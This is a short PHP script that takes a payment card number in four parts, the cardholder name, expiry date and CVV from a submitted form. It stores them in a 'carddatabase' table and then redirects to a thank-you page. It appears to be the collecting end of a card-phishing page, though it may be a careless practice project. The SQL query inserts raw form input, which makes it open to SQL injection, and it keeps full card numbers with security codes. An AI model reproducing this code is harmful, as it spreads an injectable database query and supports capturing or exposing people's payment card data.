<?php      
    include('connection.php');  

    $dbcfirst = $_POST['first'];
    $dbcsecond = $_POST['second'];
    $dbcthird = $_POST['third'];
    $dbcfourth = $_POST['fourth'];  

    $dbcname = $_POST['name'];

    $dbcmonth = $_POST['expiry'];
    $dbcyear = $_POST['year'];

    $dbccsv = $_POST['csv'];


      
        

        $sql = "INSERT INTO carddatabase (dbcfirst,dbcsecond,dbcthird,dbcfourth,dbcname,dbcmonth,dbcyear,dbccsv) VALUES ('$dbcfirst','$dbcsecond', '$dbcthird','$dbcfourth','$dbcname','$dbcmonth','$dbcyear','$dbccsv')";  

        if ($con->query($sql) === TRUE) {
            header('Location: thankyou.html');
            exit;
        } 
        else {

            header('Location: failed.html');
            exit;  
            
            }
?>